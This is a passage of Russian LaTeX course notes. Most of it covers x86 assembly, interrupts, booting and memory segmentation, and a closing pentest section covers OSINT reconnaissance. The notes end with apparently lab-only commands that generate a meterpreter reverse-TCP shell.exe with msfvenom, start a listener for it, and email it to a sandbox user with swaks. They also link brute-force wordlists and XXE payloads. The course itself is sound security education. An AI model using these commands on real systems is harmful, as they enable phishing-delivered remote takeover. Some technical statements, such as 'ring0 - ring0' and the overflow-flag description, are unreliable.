    \par \texttt{movq \%RDX, \%RSI} ; Что делает: Значение из регистра RDX копируется в RSI. После выполнения этой команды в RSI будет значение, которое было в RDX, а RDX останется без изменений. Состояние регистров: Теперь RSI содержит значение RDX, а RDX по-прежнему содержит свое первоначальное значение.
	\\
	\texttt{popq \%RDX} ; Что делает: Эта команда извлекает верхнее значение из стека и помещает его в RDX. Как это работает: Стек увеличивается на размер извлеченного элемента. Значение, которое было сохранено на стеке (изначальное значение RSI), помещается в RDX. Теперь RDX содержит исходное значение RSI, а в стеке больше нет значений.
	
	\par Эта последовательность позволяет обменивать значения в регистрах RSI и RDX, при этом не изменяя другие регистры, а также обеспечивая, что состояние стека остается неизменным после завершения выполнения кода. Важно отметить, что этот метод обмена ускоряет операцию, не требует временных переменных в других регистрах, и сохраняет целостность кода, поскольку не взаимодействует с другими регистрами общего назначения. 
	
	\subsection{Метки и переменные}
	
	\par Метка - имя для некоторого адреса в памяти. Можно ссылаться на адреса данных и адреса кода.
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=6cm]{img/3.0} 
		\captionsetup{font=footnotesize} 
		\caption*{} 
	\end{figure}
	
	\par Если вы хотите передать управление не следующей инструкции, а другой, то нужно воспользоваться инструкцией безусловного перехода. Инструкции безусловного перехода изменяют значение регистра RIP.
	
	\par Например инструкция jmp <label> В качестве аргумента она принимает метку. То есть ссылку на адрес которому нужно передать управление. Программа переходит к адресу, соответствующему метке, и продолжает выполнение с этого места. Это прямой переход, и никакие данные не сохраняются. Используется для создания циклов или для перескакивания между различными частями кода.
	
	\par Более сложный пример инструкция call <label>. Она также принимает метку, передаёт метке управление, после чего программа начинает выполнять инструкции, находящиеся под этой меткой. Адрес инструкции, следующей за call сохраняется на стеке, чтобы после завершения выполнения подпрограммы можно было вернуться к этому адресу.
	
	\par Инструкция ret. Эта инструкция завершает выполнение подпрограммы и возвращает управление обратно по адресу, сохраненному на стеке при помощи call.
	
	
	
	
	
	\par \textbf{Функции} 
	\\ Их можно вызывать и завершать 
	\\ После завершения функция должна возвращать управление вызвавшему коду
	\\ Для этого необходимо сохранять информацию откуда функцию вызвали
	\\ Как раз инструкция rat используется для завершения функции 
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=4.5cm]{img/3.1} 
		\captionsetup{font=footnotesize} 
		\caption*{} 
	\end{figure}
	
	\par \textbf{Задание}
	\\А теперь ваша задача написать функцию swap. Функция принимает на вход два указателя на 64-битные числа (в регистрах RDI и RSI) и должна обменять значения в памяти.
	\\ВАЖНО: ﻿функция принимает указатели на значения, которые нужно обменять, а не сами значения, т. е. не забудьте, что чтобы добраться до значений указатели нужно разыменовать. 
	
	
	\par \textbf{Решение}
	\\
	\texttt{swap:}
	\\
		\texttt{movq (\%RSI), \%RBX}
		\\
		\texttt{movq (\%RDI), \%RAX}
		\\
		\texttt{movq \%RBX, (\%RDI)}
        \\
		\texttt{movq \%RAX, (\%RSI)}
		\\
		\texttt{retq}
		
	\par \textbf{Флаговый регистр RFLAGS}
	\\ ZF - результат операции 0. Например получился ноль при сложении чисел, тогда будет установлен флаг 
	\\ СF - произошло беззнаковое переполнение. Например, когда мы сложили два числа и результат их сложения не помещается в 64 бита, то старшие биты будут отброшены, но будет установлен флаг, что произошло переполнение 
	\\ OF - произошло знаковое переполнение. Например при сложении чисел или вычитании, когда результат превышает максимальное значение для типа данных без знака. 
	
	\par \textbf{Инструкции условного перехода}
	\\ Они нужны для циклов как if
	\\ jcc <label> - выполняет переход, если условие сс истинно. Аргумент метка
	
	\subsection{Прерывание}
	\par \textit{Прерывание} - это событие, которое заставляет процессор прервать текущую задачу и вызвать специальный обработчик.
	\\ Когда происходит прерывание? Когда сетевая карта или клавиатура  получила данные(ну или просто внешние устройства требуют внимание), то есть прерывание происходит чтобы выполнить быстро какую-то задачу и возвращает процессор к той задаче которую он выполнял до прерывания.
	\\ Другой пример, если произошла ошибка при выполнении инструкции, например произошло деление на 0 и процессор вызывает прерывание. 
	\\В чем тогда различия между прерываниями и исключениями? на концептуальном уровне различий то особо и нет, есть отличия в деталях реализации и может быть назачении. Исключения это сопособ сообщить об ошибках ("исключительных ситуациях", отсюда и название). Прерывания это способ "прервать текущую задачу" чтобы обработать какое-то событие, т. е. исключение может быть реализовано как прерывание, но не каждое исключение обязательно сообщает о какой-то ошибке.
	\\ Можно также вызвать прерывание с помощью инструкции
	\\ Но прерывание может происходить асинхронно по отношению к коду т.е. код не готов и не сохраниться. За сохранение состояния прерванной задачи несёт ответственность \textit{обработчик прерывания}.
	\par Откуда берутся обработчики прерывания?
	\\ часть ядра ОС
	\\ ОС сообщает процессору, какой обработчик вызывать в какой ситуации.

	\par Вызов обработчика прерывания чем-то напоминает вызов функции, то есть когда обработчик прерывания завершается он скорее всего возвращает управление прерванному коду соответственно процессор должен сохранить информацию о том куда вернуть управление, кроме этого процессор сохраняет дополнительную информацию, которая выглядит примерно так как на рисунке

	\begin{figure}[h]
		\centering
		\includegraphics[height=5cm]{img/3.2} 
		\captionsetup{font=footnotesize} 
		\caption*{Два варианта сохранения информации обработчиком прерывания на стеке} 
	\end{figure}
	
	\par RIP - адрес возврата, то есть куда нужно вернуть управление по завершению обработчика прерывания.RSP - указатель стека. RFLAGS - флаговый регистор прерванного кода. В некоторых случаях процессор сохраняет Error Code. Некоторые прерывания соответствуют ошибочным ситуациям. Для некоторых из них на стек сохраняется Error code. Error code иногда содержит полезную для обработки ошибки информацию. А иногда просто содержит 0.
	
	\par Обработчик прерывания обычно завершается инструкцией iretq. Эта инструкция ожидает увидеть на стеке, то что было сохранено туда в момент вызова обработчика прерывания за исключением одного НО Если на стек был сохранён Error code, его необходимо удалить со стека перед тем как вызывать iretq. Так как iredq не готова к появлению iredq.
	\par Тело обработчика прерывания. обработчики делают разные задачи в зависимости от того из=за чего они были вызваны.
	\\ Процессор сохраняет минимум информации о прерванной задаче
	\par Однако у них есть общая часть RSP, RIP и RFLAGS. Но этого не достаточно, например прерванный код мог что-то вычислять и сохранить промежуточные результаты этих вычислений в регистрах общего назначения. Если обработчик прерывания будет использовать эти регистры он затрёт старые значения и когда управление вернётся прерванному коду и он не увидит что он там насчитал. Поэтому общая часть ещё заключается как минимум в сохранении регистров общего назначения. 
	\\ То есть все обработчики прерывания зачастую сохраняют регистры общего назначения перед тем как делать что-то, а потом восстанавливают их перед завершением прерывания.
	
	\par Как сообщить процессору какой обработчик прерывания вызывать?? За это в архитектуре x86 отвечает определённая таблица IDT(или таблица дискриптеров прерывания), которая указывает, каким прерываниям какие обработчики.
	соответствуют.
	\par Адрес этой таблицы храниться в специальном регистре IDTR. Операционная систем может записывать новое значение в этот регистор или читать старое с помощью специальных инструкций.    

    \begin{figure}[h]
    	\centering
    	\includegraphics[height=7cm]{img/3.3} 
    	\captionsetup{font=footnotesize} 
    	\caption*{В этой записи должно храниться какой обработчик вызвать, за это отвечают поля Offset(64-x ,битный адрес нашего обработчика)} 
    \end{figure}
    
    \par В IDT может быть максимум 256 записей, т.е каждое ядро может обрабатывать 256 различных прерываний. Но 32 из 256 зарегистрированы   под специальные нужды, например под деление на 0, и все эти 32 записи должны находиться в числе первых нашей таблицы. Оставшиеся 224 записи зачастую используются для обработки прерывания от внешних устройств. Как распознать какая запись в IDT какому устройству соответствует? Когда драйвер инициализирует устройство он спрашивает у операционной системы, а какой у тебя свободный номер есть в IDT? ОС запоминает этот номер и когда устройству требуется внимание оно посылает сообщение процессору и в этом сообщении указывает какую запись в IDT использовать. Другой вариант это настройка контроллера прерывания, это если устройство напрямую не может посылать сообщение процессору оно скорее всего подключено к какому-то контроллеру, контроллеру прерывания, который уже за него отправляет сообщению процессору. И за номер устройства уже будет отвечать настройка контроллера.
    
    \par \textit{Контроллер прерываний} - посредник между устройством и процессором. То есть если устройству требуется внимание оно посылает сигнал контроллеру прерывания, а уже контроллер передаёт сигнал процессору. 
    \\ Зачем это нужно? Ну например у нас много устройств и они начинают работать одновременно, нам нужно понять в каком порядке их обрабатывать(эта задача называется арбитраж - порядок обработки прерываний).
    
    \par \textbf{Зачем запрещать прерывания?} 
    \par Например задача на процессоре выполняет какую-то сложную структуру (под сложной имеется ввиду, чтобы закончить обновление требуется несколько операций - то есть не можем сделать это атомарно(операция выполняется как единое целое)) данных. Если обработчику прерываний потребуется обратиться к этой структуре она будет не в консистентном состоянии и произойдёт ошибка.
    \par Все прерывания запретить не получится например нельзя запрещать исключения. 
    \par Можно попросить устройство не генерировать прерывания. Если мы знаем, какие прерывания могут привести к проблемам и если устройство позволяет.  Если устройство подключено к контроллеру можно запретить контролеру подавать сигналы процессору.
    \par Можно запретить прерывания на процессоре. Например на архитектуре x86 это можно сделать под средством обнуления флага IF(флаг разрешения прерывания) в регистра RFLAGS. Обнуления IF делается с помощью инструкции cli(очищает флаг - запрещает прерывание). Инструкция sti устанавливает флаг обратно и включает прерывания
    
	\section{Операционные системы}
	
	\par
	
	\subsection{Загрузка}
	\par Процесс загрузки зависит от архитектуры и платформы. Вариантов загрузок очень много, поэтому нужно сейчас опишем как это примерно понять.
	\par Откуда берётся первая инструкция? 
	\par В случае архитектуры x86 процессор обращается по адресу 0xFFFFFFF0. Кто отвечает на этот запрос? Можно подумать,что это память, но зачастую для x86 это не верно. На этот запрос ему отвечает материнская карта. Так получается, за счёт того, что процессор видит мир за счёт своих контактов, соответственно запрос к памяти - это не более чем набор сигналов на этих контактах. Материнская плата видит все запросы процессора и она может либо передать их в память либо ответить на них самостоятельно. А теперь вопрос, какой код материнская карта отдаёт процессору? Два примера кода это BIOS и UEFI(самые распространённые). 
	\subsection{BIOS}
	\par POST (Power-On Self-Test) - то счего BIOS начинает свою работу. С помощью POST он проверяет все ли устройства работают, может выполнить инициализацию устройств, кроме этого ищет загрузочное устройство OC.
	\par Как BIOS ищет диск.
	\\1) Это диск с которого можно прочитать первые 512 байт(первый загрузочный сектор).
	\\2) В этом секторе последние 2 байта должны содержать два загрузочных числа 0x55 и 0xAA
	\\3) Если первые два пункта найдены, то сектор загружается в память по физическому(!!!!) адресу 0x7c00
	\\4) BIOS передаёт управление по физическому адресу 0x7c00. И это важный момент на котором мы можем на что-то повлиять. То есть если положим в эти 512 байт свой код. BIOS передаст ему управление. И отсюда мы можем передать работу нашей операционной системе.(можно загрузить свой код на материнскую карту вместо BIOS)
	\\
	\par \textbf{Окружение}
	\\ Нам известно что код начинается по физическому адресу 0x7с00. Что значит по физическому адресу? Это адрес который процессор выставляет на своих выходах, когда обращается к памяти(адрес указываемый в запросе процессора к внешним устройствам, к внешней памяти). В противовес физическому адресу есть логический адрес это адрес в том виде в котором его понимает наша программа(программа, которая исполняется на процессоре). Физический адрес не обязательно совпадает с логическим адресом.
	\\Ещё нам известно, что устройства как-то инициализированы и прерывания отключены.
	\\Процессор работает в Real Mode(это ещё один режим работы процессора)
	\\
	\par \textbf{Real Mode}
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=4cm]{img/3.4} 
		\captionsetup{font=footnotesize} 
		\caption*{} 
	\end{figure}
	
	\subsection{Сегментная адресация памяти} 
	
	\par Наименьшим адресуемым блоком памяти является \textit{байт} (8 бит). Каждый байт памяти имеет уникальное местоположение, называемое физическим адресом, по которому в него может записываться и читаться информация. 
	
	\par Чтобы получить доступ к ячейке памяти процессору надо знать ее физический адрес. Для доступа к памяти процессор имеет адресную шину, на которой выставляет адрес ячейки памяти к которой ему необходим доступ. Грубо говоря, адресная шина – это «ноги» (pins) процессора на которых он выставляет адрес ячейки в двоичной системе счисления.
	
	\par Например, чтобы адресовать память размером в четыре байта (у каждого байта свой адрес), процессору, было бы, достаточно адресной шины в два бита (две «ноги). Так как, с помощью двух бит (\(2^2=4\) как раз 4 ячейки) можно было бы адресовать 4 ячейки памяти: адрес 00b – 1-ая ячейка (байт), адрес 01b – 2-ая ячейка (байт), адрес 10b – 3-я ячейка (байт), 11 – 4-ая ячейка (байт). Таким образом, очевидно, что чем большую разрядность имеет адресная шина процессора, с тем большим объемом памяти он может работать.
	
	\par Процессор 8086 имел 20 битную адресную шину. Что позволяло адресовать 1048576 байт (220) памяти или округленно 1 Мбайт. Проблема состояла в том, что процессор 8086 имел 16 битную архитектуру. То есть все его регистры были 16 битными. А с помощью 16 бит можно адресовать только 65536 (216) байт памяти или округленно 64 Кбайт. Тогда каким же образом процессор 8086 адресовал 1 Мбайт памяти?
	
	\par Решением стала сегментная адресация памяти. С помощью этого метода физический адрес конкретного байта памяти может логически определятся двумя 16-разрядными значениями. Для того, чтобы с помощью 16-разрядных регистров можно было обращаться в любую точку 20-разрядного адресного пространства, введён двухкомпонентный логический адрес из двух 16-разрядных компонент:
	\\
	\\
	\textbf{Segment} (сегмент) : \textbf{Offset} (смещение)
	\\
	Пример: \textbf{13DF:0100}
	\\
	Где Segment – адрес сегмента, а Offset – смещение от начала этого сегмента.
	\\
	
	\subsection{Управление памятью}
	
	\par \textit{Логическая память} - как видит память программа. Логический адрес - то что программа использует в качестве указателя на какую-то ячейку памяти.
	
	\par \textit{Физическая память} - как процессор видит память. Логические адреса отображаются на физические. Всё, что соблюдает интерфейс, выглядит как физическая память для CPU. 
	
	\par Не все физические адреса соответствуют памяти, например они могут соответствовать устройству или на их месте может быть "дыра", то есть по физическому адресу ничего нету.
	
	\par Откуда взять информацию о конфигурации физической памяти? Из документации аппаратной платформы. Система на кристалле(SoC) - на одной микросхеме процессор, память и все устройства, в такой системе проблема что-то заменить. Ещё вариант узнать в программном обеспечении материнской карты: BIOS(прерывание 0x15, команда 0xe820), UEFI(функция GetMemoryMap). Третий вариант узнать у загрузчика GRUB с помощью спецификации multiboot.
	
	\par \textit{Зачем разделение на физическую и логическую память?} Абстракция - приложение не знает о структуре физической памяти(как мы говорили ранее физическая память устроенна довольно сложно и в ней могут быть "дыры"). Изоляция и защита - каждое приложение имеет своё логическое адресное пространство.
	
	\par \textit{Процесс} - контейнер для ресурсов OC. Операционная система распределяет ограниченное количество аппаратных ресурсов(физическая память разделяется и отдаётся процессам) между пользователями. Процессы по умолчанию изолированны друг от друга, у каждого процесса своё логическое адресное пространство. Это логическое пространство каким-то образом отображено на ту физическую память которую этому процессу выделила операционная система т.е. код в рамках одного процесса не может залезть в память другого процесса. Но если в рамках одного процесса у нас есть сразу несколько потоков исполнения они будут использовать общие ресурсы. В операционной системе логическое адресное пространство и память одного процесса изолированно от логического адресного пространства другого процесса.
	
	\subsection{Сегментация Real Mode}
	
	\par \textit{SEG} - идентификатор сегмента физической памяти. Сегмент SEG начинается по физическому адресу SEG x 16. Сегмент SEG имеет размер \(2^{16}\) байт. Что если разрешить OC изменять параметры сегмента? Она сохраняет адрес(то где начинается сегмент) и его размер. 
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=8cm]{img/3.6} 
		\captionsetup{font=footnotesize} 
		\caption*{Таблица дескрипторов сегмента} 
	\end{figure}
	
	\par OC выдаёт каждому процессу свой дескриптор (SEG). Каждый дескриптор описывает свой участок физической памяти. Разные процессы пользуются разными дескрипторами. Непривилегированному коду запрещено изменять сегментные регистры.
	
	\begin{figure}[h]
		\centering
		\includegraphics[height=4cm]{img/3.7} 
		\captionsetup{font=footnotesize} 
		\caption*{Селектор сегментов} 
	\end{figure}
	
	\par CPL - хранит уровень привилегий текущего исполняемого кода.
	
	\par В x86 есть три уровня привилегий: ring0 - ring0. Основные ring0 - наивысший уровень привилегий, ring3 - низший уровень привилегий(пользовательские приложения).
	
	\par gdb run info registers. Глобальная и локальная таблица дескрипторов.
	
	\par \textit{Paging} - техника организации логического адресного пространства процесса. Мы хотим абстрагироваться от физического адресного пространства. память одного процесса должна быть изолированна от другого процесса.
	
	\section{Белый хакер}
	
	\par \textbf{Пентестер} - это специалист, проводящий испытание на проникновение с целью демонстрации возможности компрометации информационной системы и оценки возможности ее осуществления.
	
	\par \textbf{Тестирование на проникновение (жарг. Пентест или Пентестинг)} - метод оценки безопасности компьютерных систем или сетей средствами моделирования атаки злоумышленника. Процесс включает в себя активный анализ системы на наличие потенциальных уязвимостей, которые могут спровоцировать некорректную работу целевой системы, либо полный отказ в обслуживании. Анализ ведётся с позиции потенциального атакующего и может включать в себя активное использование уязвимостей системы. Результатом работы является отчёт, который содержит в себе все найденные уязвимости системы безопасности, а также может содержать рекомендации по их устранению. 
	
	\par Цель белого хакера – \textit{продемонстрировать возможности потенциального злоумышленника по компрометации информационной системы} и, выявив все возможности компрометации (угрозы, уязвимости, недостатки), передать их владельцу исследуемой системы для устранения угроз и повышения защищенности системы. Именно \textbf{повышение защищенности информационных систем} является результатом работы белого хакера.
	
	\par \textbf{Этапы проведения атак и компрометации информационных систем}
	\\
	\textbf{Reconnaissance (англ. Разведка)} — это процесс сбора информации об инфраструктуре и уязвимостях компании, который выполняют, чтобы определить, какие действия могут быть выполнены для ее компрометации.
	\\
	\textbf{Weaponization (англ. Вооружение)} — это процесс создания и подготовки действующим лицом программного обеспечения и инструментов, которое может использоваться для атаки на инфраструктуру компании.
	\\
	\textbf{Delivery (англ. Доставка)} — это процесс доставки программного обеспечения на устройства в сети компании.
	\\
	\textbf{Exploitation (англ. Эксплуатация)} — это процесс использования уязвимостей в инфраструктуре компании, обнаруженных на этапе разведки, для получения несанкционированного доступа.
	\\
	\textbf{Installation (англ. Установка)} — это процесс установки вредоносного программного обеспечения на компьютеры или серверы в сети компании для закрепления полученного доступа в системе.
	\\
	\textbf{Command and control (англ. Командование и контроль)} — это процесс установки соединения между скомпрометированным компьютером и управляющим им ПО, и сервером действующего лица, который дает лицу возможность удаленно управлять компьютером.
	\\
	A\textbf{ctions on objective (англ. Действия по достижению цели)} — это процесс выполнения действующим лицом своих целей, которые могут включать выполнение таких недопустимых для организации событий как: кражу данных, шпионаж, вредоносные действия и другие действия, которые могут нанести ущерб инфраструктуре компании.
	
	\par \textbf{Этапы, которые проходит хакер для достижения цели:}
	\\
	Разведка во внешней сети
	\\
	Атаки первичного доступа
	\\
	Закрепление доступа  
	\\
	Повышение привилегий
	\\
	Выход за рамки демилитаризованной зоны (ДМЗ) и ограничений сети
	\\
	Проброс трафика в другие сегменты
	\\
	Разведка в локальной сети
	\\
	Захват управления инфраструктурой сети
	\\
	Противодействие обнаружению и реагированию
	
	\subsection{Процесс сбора информации о внешней инфраструктуре. OSINT}
	
	\par \textbf{OSINT (Open Source Intelligence)} — это методология сбора, анализа и использования открытой информации из различных источников для получения разведывательных данных или информации, полезной для принятия решений.
	
	\par Открытые источники информации могут включать в себя интернет-ресурсы, социальные сети, газеты, журналы, телевидение, радио, публичные базы данных и другие источники, которые не требуют специальных разрешений или привилегий для доступа к ним.
	
	\par Конечная цель сбора информации — получить как можно больше данных, относящихся к целевой компании.
	
	\par \textit{Общие методы сбора информации разделяются на две категории: активные и пассивные.}
	
	\par \textbf{Активные методы сбора информации в OSINT} – это методы, которые требуют непосредственного взаимодействия с источником информации, например, с использованием запросов, сканирования портов и опроса сервисов.
	
	\par Иначе говоря, непосредственный владелец ИТ-инфраструктуры сможет определить применение по отношению к нему активных методов сбора информации, т.к. его системы получат запросы от действующего лица и его программ. При активном методе ваши сетевые запросы приходят прямо от ваших систем на системы владельца, и он может их увидеть.
	
	\par \textit{Примеры активных методов сбора информации включают}:
	
	\par Сканирование портов – это способ, который позволяет определить, какие порты на серверах компании открыты для доступа извне. Сканирование портов может помочь определить, какие службы доступны на серверах и какая операционная система установлена на серверах.
	
	\par Энумерация и предугадывание доменных имен – это способы определения доменных имён, которые используются компанией или организацией. Этот процесс может включать в себя использование различных методов, таких, как перебор имен поддоменов, используемых в названии компании, и различных вариантов доменных зон (например, .com, .org, .net).
	
	\par Посещение и анализ сайтов – это способы углубленного анализа сайтов на предмет их функций, используемых ими технологий, поиске отладочной и технической информации о внутренней сети или устройстве ПО организации.
	
	\par \textbf{Пассивные методы сбора информации в OSINT} – это методы, которые не требуют непосредственного взаимодействия с источником информации.
	
	\par \textit{Примеры пассивных методов сбора информации включают:}
	
	\par Поиск в сети Интернет – это процесс отслеживания и анализа информации, публикуемой в онлайн-ресурсах, включая репозитории, блоги, форумы и другие интернет-сайты, вакансии.
	
	\par Анализ открытых баз данных – это процесс сбора информации из открытых баз данных, таких, как государственные реестры, базы данных компаний, справочники и т.д.
	
	\par Анализ открытых источников информации – это процесс сбора и анализа информации, полученной из различных открытых источников, таких, как сайты-агрегаторы утечек данных, сайты, собирающие информацию о изменении DNS имен и историю DNS, сайты, исследующие интернет и опубликованные в нем сервисы.
	
	
	\par Собираем: Доменные имена, IP-адреса и сервисы 

	\par \textbf{Сбор информации автоматизированным средствами}
	
	\par \textbf{Ход действий}

	\par 1. Начинаем с проверки существования доменного имени cyber-ed.ru командой: \textbf{host cyber-ed.ru}
	
	\par Утилита \textbf{host} есть в большинстве популярных ОС. Вызов команды host cyber-ed.ru в Linux позволяет получить информацию о доменном имени "cyber-ed.ru". Конкретно, эта команда выполняет DNS-запрос для определения IP-адреса, связанного с этим доменным именем, и выводит результаты в терминал.
	
	\par В ответ на команду "host cyber-ed.ru" будет выведена одна или несколько строк, содержащих информацию об IP-адресе, ассоциированном с доменным именем "cyber-ed.ru", а также что на этом доменном имени настроена почтовая служба. Убедившись в существовании данного доменного имени, мы можем перейти к поиску информации о прочих доменных именах, связанных с ним.
	
	\par 2. Перейдем на сайт \textbf{https://dnsdumpster.com/} для быстрого изучения известной информации о домене и связанных с ним ресурсов.
	
	
	\par 3. Далее переходим на сайт \textbf{https://crt.sh/}. Сервис crt.sh — это база данных открытых SSL/TLS-сертификатов, которые были выданы для доменных имен. Сервис позволяет просматривать информацию о сертификатах и узнавать, какие доменные имена были зарегистрированы на конкретное лицо или организацию.
	
	
	\par 4. После использования методов пассивного сбора информации (о том, что такое "пассивный" и "активный" сбор информации, мы поговорим в следующих шагах) перейдем к методам активного сбора информации, ​а именно, ​​​​​​воспользуемся утилитой Amass. 
	\\
	Утилита \textbf{Amass} — это инструмент для сбора информации об инфраструктуре, который используется в тестировании на проникновение, исследовании цифровых активов и других областях информационной безопасности. Amass может помочь исследователям обнаруживать активные домены, поддомены, IP-адреса, а также другую связанную с инфраструктурой информацию. Amass использует множество источников данных, включая базы данных WHOIS, поиск по DNS, поиск веб-страниц, сборщики данных, базы данных сертификатов и другие. Он также может использовать дополнительные источники данных, предоставляемые пользователем.
	\\
	yay amass-bin ..... amass enum -v -d cyber-ed.ru
	
	\par amass enum -v -d cyber-ed.ru - эта команда выполняет следующие действия:
	
	\par "\textbf{amass enum}" указывает на использование инструмента amass для выполнения операций по перечислению поддоменов и доменных имен.
	
	\par Опция "\textbf{-v}" представляет собой флаг, обозначающий подробный или verbose режим работы, что означает, что команда будет выводить более подробную информацию во время выполнения.
	
	\par Опция "\textbf{-d} cyber-ed.ru" используется для указания целевого домена, в данном случае, "cyber-ed.ru", для выполнения процесса перечисления поддоменов и доменных имен конкретно для этого домена.
	
	\par В результате использования всех этих инструментов мы смогли обнаружить список ресурсов, связанных с основным доменным именем, и расширили набор данных о цели, которые будут нужны в дальнейших шагах по оценке защищенности организации.
	 
	\par yay -S subfinder    sudo pacman -S inetutils   sudo pacman -S nmap
	\par sudo subfinder -d cyber-ed.ru список поддоменов host -t txt task.cyber-ed.ru  
	\par sudo pacman -S docker  sudo pacman -S docker-compose
	\par sudo systemctl start docker
	sudo systemctl enable docker
	\par wget <URL\_ДЛЯ\_СКАЧИВАНИЯ>  unzip courses-shop.zip cd courses-shop-prod
	docker-compose up -d http://localhost:1337 sudo usermod -aG docker \$USER
	reboot docker-compose up -d

	\par ffuf -w /home/frodelian/Downloads/fuzz.txt -u /FUZZ/ -fc 403 -of csv -o results.csv сохранит в файл 
	
	\par https://github.com/empty-jack/YAWR/tree/master/brute
	\par burp suite, hydra программы 
	\par словари паролей  https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt         https://github.com/empty-jack/YAWR/blob/master/brute/passwords/realyBest.txt
	
	\par payload all the things xxe https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE\%20Injection
	\par ip addr show
	\par nmap -sn 192.168.1.0/24
	\par nmap -p 25 192.168.1.78
	\par msfvenom -p windows/meterpreter/reverse-tcp LHOST=192.168.1.78 LPORT=4444 -f exe -o shell.exe
	\par msfconsole
	use exploit/multi/handler
	set payload windows/meterpreter/reverse-tcp
	set LHOST 192.168.1.78
	set LPORT 4444
	
	run
	\par swaks --to mike@sandbox.local --from frodelian@sandbox.local --server 192.168.1.78 --attach shell.exe
	\par curl ifconfig.me Внешний IP 93.185.198.234
	\par set LHOST 93.185.198.234 set LPORT 25 exploit
	\par sudo ss -tuln | grep :25
\end{document}
